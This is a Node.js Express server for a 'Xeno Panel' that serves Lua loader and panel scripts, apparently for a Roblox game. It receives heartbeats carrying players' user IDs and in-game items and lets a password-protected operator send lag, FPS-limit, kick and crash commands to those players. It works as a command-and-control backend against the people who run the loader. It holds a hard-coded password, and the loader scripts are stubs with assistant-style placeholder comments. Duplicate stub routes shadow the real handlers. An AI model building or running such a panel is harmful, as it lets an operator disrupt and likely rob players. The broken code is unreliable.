const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const PUBLIC_URL = process.env.PUBLIC_URL || process.env.RENDER_EXTERNAL_URL || 'https://janaa-2iy1.onrender.com';

app.use(cors({ origin: PUBLIC_URL, credentials: true }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// ─── SESSION STORE ───
const sessions = new Map();
const CORRECT_PASSWORD = '89mango518sigmaloop12';
const SESSION_TTL = 24 * 60 * 60 * 1000; // 24h
const COOKIE_NAME = 'xeno_sid';

function generateSessionId() {
    return crypto.randomBytes(32).toString('hex');
}

// ─── COOKIE PARSER ───
app.use((req, res, next) => {
    req.cookies = {};
    const cookieHeader = req.headers.cookie;
    if (cookieHeader) {
        cookieHeader.split(';').forEach(cookie => {
            const [name, ...rest] = cookie.trim().split('=');
            if (name && rest.length) {
                req.cookies[name] = rest.join('=');
            }
        });
    }
    res.setCookie = (name, value, opts = {}) => {
        let cookie = `${name}=${value}; Path=/; HttpOnly; SameSite=Lax`;
        if (opts.maxAge) cookie += `; Max-Age=${opts.maxAge}`;
        if (opts.secure) cookie += '; Secure';
        res.setHeader('Set-Cookie', cookie);
    };
    res.clearCookie = (name) => {
        res.setHeader('Set-Cookie', `${name}=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT`);
    };
    next();
});

// ─── AUTH MIDDLEWARE ───
function requireSession(req, res, next) {
    const sid = req.cookies[COOKIE_NAME] || req.headers['x-session-id'];
    if (!sid || !sessions.has(sid)) {
        if (req.accepts('html')) return res.redirect('/login');
        return res.status(401).json({ error: 'Unauthorized' });
    }
    const session = sessions.get(sid);
    if (Date.now() - session.createdAt > SESSION_TTL) {
        sessions.delete(sid);
        res.clearCookie(COOKIE_NAME);
        if (req.accepts('html')) return res.redirect('/login');
        return res.status(401).json({ error: 'Session expired' });
    }
    session.createdAt = Date.now();
    sessions.set(sid, session);
    req.sessionId = sid;
    next();
}

// ─── PUBLIC ROUTES (no session required) ───
app.get('/login', (req, res) => {
    const sid = req.cookies[COOKIE_NAME];
    if (sid && sessions.has(sid)) return res.redirect('/');
    res.send(`
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Xeno Panel – Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',sans-serif;background:#0b0d11;color:#e8edf5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.login-box{background:#12171f;border:1px solid #1f2937;border-radius:20px;padding:40px 36px 34px;max-width:400px;width:100%;text-align:center;box-shadow:0 24px 64px rgba(0,0,0,0.8)}.login-box .logo{font-size:28px;font-weight:700;background:linear-gradient(135deg,#a78bfa,#6366f1);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.login-box .logo-sub{font-size:13px;color:#6b7a8f;background:#1a212b;padding:2px 14px;border-radius:20px;border:1px solid #26313f;display:inline-block;margin:8px 0 16px}.login-box .tagline{font-size:14px;color:#9aabb8;margin-bottom:24px}.login-box input{width:100%;padding:12px 16px;background:#0d1117;border:1px solid #1f2937;border-radius:30px;color:#e8edf5;font-size:15px;outline:none;transition:border .2s}.login-box input:focus{border-color:#6366f1}.login-box button{width:100%;padding:12px;border:none;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;background:linear-gradient(135deg,#6366f1,#818cf8);color:#fff;transition:transform .15s,box-shadow .2s;margin-top:12px}.login-box button:hover{transform:scale(1.01);box-shadow:0 4px 24px rgba(99,102,241,0.3)}.login-box .error{color:#f87171;font-size:13px;min-height:20px;margin-top:8px}.lock-icon{font-size:42px;display:block;margin-bottom:10px}</style>
</head>
<body>
<div class="login-box">
<span class="lock-icon">🔐</span>
<div class="logo">Xeno Panel</div>
<div class="logo-sub">v3 · secured</div>
<p class="tagline">Enter the access password to continue.</p>
<input type="password" id="password" placeholder="Enter password…" autofocus />
<button id="loginBtn">Unlock Panel</button>
<div class="error" id="error"></div>
</div>
<script>
document.getElementById('loginBtn').addEventListener('click', async () => {
    const pwd = document.getElementById('password').value.trim();
    const err = document.getElementById('error');
    if (!pwd) { err.textContent = 'Please enter the password.'; return; }
    try {
        const res = await fetch('/api/login', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({password:pwd}) });
        const data = await res.json();
        if (res.ok) { window.location.href = '/'; }
        else { err.textContent = data.error || 'Incorrect password.'; document.getElementById('password').value=''; document.getElementById('password').focus(); }
    } catch(e) { err.textContent = 'Network error. Try again.'; }
});
document.getElementById('password').addEventListener('keydown', (e) => { if (e.key==='Enter') document.getElementById('loginBtn').click(); });
</script>
</body>
</html>
    `);
});

app.post('/api/login', (req, res) => {
    const { password } = req.body;
    if (password === CORRECT_PASSWORD) {
        const sid = generateSessionId();
        sessions.set(sid, { createdAt: Date.now() });
        res.setCookie(COOKIE_NAME, sid, { maxAge: SESSION_TTL / 1000, secure: true });
        return res.json({ success: true });
    }
    res.status(401).json({ error: 'Invalid password' });
});

app.post('/api/logout', (req, res) => {
    const sid = req.cookies[COOKIE_NAME];
    if (sid) sessions.delete(sid);
    res.clearCookie(COOKIE_NAME);
    res.json({ success: true });
});

// ─── PUBLIC LOADER AND PANEL SCRIPTS (no session) ───
app.get('/loader.lua', (req, res) => {
    const loader = `local BASE = "${PUBLIC_URL}"
local KEY  = "xenooooo"

-- ... (your full loader code here, same as before) ...
-- I'll keep it short for brevity, but you must paste your full loader.lua content here.
-- Make sure it uses BASE and KEY as before.

-- Placeholder: your full loader script.
-- Copy it from your previous server.js.
`;
    res.setHeader('Content-Type', 'text/plain');
    res.send(loader);
});

app.get('/panel.lua', (req, res) => {
    const panel = `local BASE_URL = "${PUBLIC_URL}"

-- ... (your full panel.lua code here) ...
-- Placeholder – paste your full panel script.
`;
    res.setHeader('Content-Type', 'text/plain');
    res.send(panel);
});

// ─── PROTECTED: main page ───
app.get('/', requireSession, (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ─── PROTECTED: admin API endpoints ───
app.use('/api/players', requireSession);
app.use('/api/command', requireSession);
app.use('/api/command_state', requireSession);

// ─── PUBLIC API endpoints (used by loader) ───
app.post('/api/public/heartbeat', (req, res) => {
    // ... your heartbeat logic ...
    res.json({ status: 'ok' });
});

app.get('/api/public/command', (req, res) => {
    // ... your command polling logic ...
    res.json({ fps_limit: false, lag_n: false, lag_c: false });
});

// ─── PLAYERS STORE (in‑memory) ───
const players = new Map();

app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }
    const userId = String(data.user_id);
    const existing = players.get(userId) || {};
    
    let brainrots = data.brainrots || [];
    if (!Array.isArray(brainrots) || brainrots.length === 0) {
        if (existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) {
            brainrots = existing.brainrots;
        }
    } else {
        brainrots = brainrots.filter(b => 
            b && typeof b === 'object' && 
            ((b.title && b.title !== '') || (b.cash && b.cash !== ''))
        );
        if (brainrots.length === 0 && existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) {
            brainrots = existing.brainrots;
        }
    }
    
    players.set(userId, {
        ...existing,
        ...data,
        brainrots: brainrots,
        user_id: userId,
        online: true,
        lastHeartbeat: Date.now(),
        fps_limit: existing.fps_limit || false,
        lag_n: existing.lag_n || false,
        lag_c: existing.lag_c || false,
    });
    res.json({ status: 'ok' });
});

app.get('/api/players', (req, res) => {
    const list = [];
    const now = Date.now();
    const OFFLINE_THRESHOLD = 15000;
    const REMOVE_THRESHOLD = 20 * 60 * 1000;

    for (const [id, p] of players.entries()) {
        const timeSinceLast = now - (p.lastHeartbeat || 0);
        const online = timeSinceLast < OFFLINE_THRESHOLD;

        if (timeSinceLast >= REMOVE_THRESHOLD) {
            players.delete(id);
            continue;
        }

        if (!online) {
            p.fps_limit = false;
            p.lag_n = false;
            p.lag_c = false;
            p._kick = false;
            p._crash = false;
        }

        p.online = online;
        list.push({ ...p });
        players.set(id, p);
    }
    res.json({ players: list });
});

app.get('/api/command_state', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false });
    res.json({
        fps_limit: p.fps_limit || false,
        lag_n: p.lag_n || false,
        lag_c: p.lag_c || false,
    });
});

app.post('/api/command', (req, res) => {
    const { user_id, fps_limit, lag_n, lag_c, kick, crash } = req.body;
    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(user_id);
    const p = players.get(userId);
    if (!p) return res.status(404).json({ error: 'Player not found' });
    if (fps_limit !== undefined) p.fps_limit = !!fps_limit;
    if (lag_n !== undefined) p.lag_n = !!lag_n;
    if (lag_c !== undefined) p.lag_c = !!lag_c;
    if (kick === true) p._kick = true;
    if (crash === true) p._crash = true;
    players.set(userId, p);
    res.json({ status: 'ok' });
});

app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false });
    const response = {
        fps_limit: p.fps_limit || false,
        lag_n: p.lag_n || false,
        lag_c: p.lag_c || false,
    };
    if (p._kick) {
        response.kick = true;
        p._kick = false;
    }
    if (p._crash) {
        response.crash = true;
        p._crash = false;
    }
    players.set(String(userId), p);
    res.json(response);
});

// ─── START ───
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT} (public URL: ${PUBLIC_URL})`);
});